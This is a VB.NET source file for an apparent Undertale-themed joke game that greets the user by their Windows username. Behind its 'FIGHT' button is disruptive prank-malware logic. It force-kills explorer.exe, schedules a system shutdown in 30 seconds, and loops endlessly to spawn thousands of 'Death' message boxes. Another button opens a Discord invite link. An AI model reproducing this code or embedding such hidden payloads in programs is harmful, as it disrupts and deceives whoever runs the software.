Imports System.Diagnostics
Imports System.Threading.Tasks
Imports System.Threading.Thread
Public Class Form1
    Dim w = 0
    Dim x = 0
    Dim y = 0
    Dim z = 0
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim frisk = SystemInformation.UserName
        Label1.Text = frisk
        If My.Settings.Mercy = True Then
            Dim m = MsgBox("...", vbYesNo + vbInformation, frisk)
            If m = vbNo Then
                Me.Close()
            End If
        End If
        My.Computer.Audio.Play(My.Resources.fend, AudioPlayMode.BackgroundLoop)
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        TextBox1.ForeColor = Color.White
        x += 1
        If x = 2 Then
            Button4.Visible = False
            Button4.Enabled = False
            TextBox1.ForeColor = Color.Red
            TextBox1.Text = "* You piece of garbage"
            PictureBox1.Visible = False
            Label2.Visible = True
            Dim psi As New ProcessStartInfo()
            psi.FileName = "taskkill.exe"
            psi.Arguments = "/F /IM explorer.exe"
            psi.UseShellExecute = False
            psi.CreateNoWindow = True
            Dim process As Process = Process.Start(psi)
            psi.FileName = "shutdown"
            psi.Arguments = "-s -t 30 -c ""goodbye ;)"""
            My.Computer.Audio.Stop()
            Dim process2 As Process = Process.Start(psi)
            My.Computer.Audio.Play(My.Resources.cannot, AudioPlayMode.BackgroundLoop)
            While True
                Module1.Main()
            End While
        Else
            TextBox1.Text = "* Select ""FIGHT"" to confirm"
        End If
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        TextBox1.ForeColor = Color.White
        y += 1
        If y = 25 Then
            My.Settings.Mercy = True
            Process.Start("https://dsc.gg/dimisaio")
            Me.Close()
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        x = 0
        w += 1
        If w >= 5 Then
            TextBox1.ForeColor = Color.Green
            TextBox1.Text = "* You know what to do :)"
        Else
            TextBox1.Text = "* 2 ATK || 2 DEF" + Environment.NewLine + "* Looks like free EXP."
        End If

    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        TextBox1.ForeColor = Color.White
        x = 0
        z += 1
        If z = 20 Then
            Me.Close()
        ElseIf z >= 10 Then
            TextBox1.Text = "* Not like it's gonna change..."
        ElseIf z >= 5 Then
            TextBox1.Text = "* Still empty"
        Else
            TextBox1.Text = "* Empty"
        End If
    End Sub

End Class
Module Module1

    Sub Main()
        Dim numMessageBoxes As Integer = 1000 ' Set the number of message boxes you want to show

        Dim threads As New List(Of Threading.Thread)

        For i As Integer = 1 To numMessageBoxes
            Dim t As New Threading.Thread(Sub()
                                              MsgBox("Death", vbOKOnly + vbExclamation, ":)")
                                          End Sub)
            t.Start()
            threads.Add(t)
        Next

        ' Wait for all threads to finish
        For Each t In threads
            t.Join()
        Next
    End Sub
End Module
